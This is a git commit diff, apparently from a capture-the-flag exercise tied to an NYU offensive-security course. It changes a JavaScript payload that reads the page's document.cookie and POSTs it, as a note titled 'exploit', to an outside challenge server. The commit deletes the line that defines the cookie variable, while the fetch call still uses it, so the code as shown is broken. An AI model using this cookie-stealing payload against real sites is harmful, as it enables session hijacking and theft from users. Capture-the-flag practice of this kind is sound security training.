7bc68ee14373c823b91b55e09d68dc59f7347c43
Arti <123784674+wandaversion@users.noreply.github.com>
2024-04-09 21:42:14 -0400

    Update and rename cslmnopb.js to cslmnopc.js

--- cslmnopc.js
+++ cslmnopc.js
@@ -1,4 +1,3 @@
-var cookie_flag = document.cookie;
 fetch('http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new', {
     method: 'POST',  
     body: JSON.stringify({ title: 'exploit', content: cookie_flag })
